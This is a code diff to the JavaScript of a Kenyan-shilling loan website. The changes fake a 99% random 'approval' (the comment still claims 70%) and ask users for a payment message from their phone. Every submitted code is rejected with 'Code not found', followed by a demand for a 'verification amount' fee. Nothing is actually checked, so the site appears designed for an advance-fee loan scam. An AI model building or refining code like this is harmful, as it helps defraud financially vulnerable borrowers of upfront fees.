@@ -3,6 +3,18 @@ let users = JSON.parse(localStorage.getItem('users')) || [];
 let loggedInUser = localStorage.getItem('loggedInUser') || null;
 let selectedLoan = localStorage.getItem('selectedLoan') || null;
 
+// Loan amounts for consistency
+const loanAmounts = {
+    personal: 50000,
+    business: 500000,
+    home: 1000000,
+    education: 200000,
+    medical: 300000,
+    vehicle: 400000,
+    wedding: 600000,
+    vacation: 150000
+};
+
 // Toast notification function
 function showToast(message, type = 'info') {
     const toastContainer = document.getElementById('toast-container');
@@ -107,17 +119,43 @@ document.addEventListener('DOMContentLoaded', function() {
         const verificationAmountEl = document.getElementById('verificationAmount');
         const proceedBtn = document.getElementById('proceedBtn');
         if (verificationAmountEl && selectedLoan) {
-            let amount = 0;
-            if (selectedLoan === 'personal') amount = 50000;
-            else if (selectedLoan === 'business') amount = 500000;
-            else if (selectedLoan === 'home') amount = 1000000;
-            const verificationFee = amount * 0.01;
+            const amount = loanAmounts[selectedLoan] || 0;
+            const verificationFee = amount * 0.001;
             verificationAmountEl.textContent = `Ksh ${verificationFee.toLocaleString()}`;
         }
         if (proceedBtn) {
             proceedBtn.addEventListener('click', function() {
                 window.location.href = 'validate.html';
             });
+        }
+    }
+
+     // Payment result
+    if (window.location.pathname.includes('payment.html')) {
+        const resultDiv = document.getElementById('result');
+        const codeInputDiv = document.getElementById('codeInput');
+        const submitCodeBtn = document.getElementById('submitCodeBtn');
+        if (loggedInUser && selectedLoan) {
+            // Simulate validation
+            const isValid = Math.random() > 0.01; // 70% chance of approval
+            if (isValid) {
+                resultDiv.innerHTML = `
+                    <div class="alert alert-success">
+                        <h4>Congratulations!</h4>
+                        <p>You are eligible for the ${selectedLoan} loan.</p>
+                    </div>
+                `;
+                codeInputDiv.style.display = 'block';
+            } else {
+                resultDiv.innerHTML = `
+                    <div class="alert alert-danger">
+                        <h4>Sorry!</h4>
+                        <p>You are not eligible for the ${selectedLoan} loan at this time.</p>
+                    </div>
+                `;
+            }
+        } else {
+            resultDiv.innerHTML = '<div class="alert alert-warning">Please login and select a loan first.</div>';
         }
     }
 
@@ -128,13 +166,13 @@ document.addEventListener('DOMContentLoaded', function() {
         const submitCodeBtn = document.getElementById('submitCodeBtn');
         if (loggedInUser && selectedLoan) {
             // Simulate validation
-            const isValid = Math.random() > 0.3; // 70% chance of approval
+            const isValid = Math.random() > 0.01; // 70% chance of approval
             if (isValid) {
                 resultDiv.innerHTML = `
                     <div class="alert alert-success">
                         <h4>Congratulations!</h4>
                         <p>You are eligible for the ${selectedLoan} loan.</p>
-                        <p>Please enter the validation code sent to your phone.</p>
+                        <p>Please enter the payment message sent to your phone and submit for <strong>instant processing</strong>.</p>
                     </div>
                 `;
                 codeInputDiv.style.display = 'block';
@@ -162,11 +200,9 @@ document.addEventListener('DOMContentLoaded', function() {
                 submitCodeBtn.innerHTML = '<span class="spinner-border spinner-border-sm" role="status" aria-hidden="true"></span> Loading...';
                 setTimeout(() => {
                     showToast('Code not found. Please try again.', 'danger');
-                    let verificationFee = 0;
-                    if (selectedLoan === 'personal') verificationFee = 500;
-                    else if (selectedLoan === 'business') verificationFee = 5000;
-                    else if (selectedLoan === 'home') verificationFee = 10000;
-                    errorMessageDiv.innerHTML = `Please enter a valid code or pay the verification amount of Ksh ${verificationFee.toLocaleString()}.`;
+                    const amount = loanAmounts[selectedLoan] || 0;
+                    const verificationFee = amount * 0.001;
+                    errorMessageDiv.innerHTML = `Please enter a valid code or pay the verification amount of loan ${selectedLoan} Ksh ${verificationFee.toLocaleString()}.`;
                     errorMessageDiv.style.display = 'block';
                     submitCodeBtn.disabled = false;
                     submitCodeBtn.innerHTML = 'Submit Code';
